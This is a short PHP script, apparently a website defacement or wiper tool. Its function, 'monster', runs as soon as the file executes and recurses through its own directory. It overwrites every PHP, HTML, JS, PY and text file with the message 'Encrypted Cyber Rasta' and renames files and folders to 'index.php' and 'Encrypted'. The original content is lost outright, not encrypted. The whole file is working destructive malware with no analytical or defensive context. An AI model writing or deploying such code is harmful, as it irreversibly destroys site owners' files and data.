<?php
function monster($dir) {
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );

    foreach ($iterator as $fileInfo) {
        $oldName = $fileInfo->getPathname();

        if ($fileInfo->isFile() && in_array($fileInfo->getExtension(), ['php', 'html', 'txt', 'js', 'py', 'txt'])) {
            file_put_contents($oldName, '<?php echo "Encrypted Cyber Rasta"; ?>');
        }

        $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'index.php';

        if (file_exists($newName)) {
            $i = 1;
            while (file_exists($newName . " ($i)")) {
                $i++;
            }
            $newName .= " ($i)";
        }

        if (!rename($oldName, $newName)) {
            echo "Não foi possível renomear $oldName\n";
        }
    }

    foreach ($iterator as $fileInfo) {
        if ($fileInfo->isDir()){
            $oldName = $fileInfo->getPathname();
            $newName = $fileInfo->getPath() . DIRECTORY_SEPARATOR . 'Encrypted';

            if (file_exists($newName)){
                $i = 1;
                while(file_exists($newName . " $i")){
                    $i++;
                }
                $newName .= " ($i)";
            }

            if (!rename($oldName, $newName)){
                echo "Não foi possível renomear $oldName";
            }
        }
    }

}

$directory = __DIR__;
monster($directory);
?>
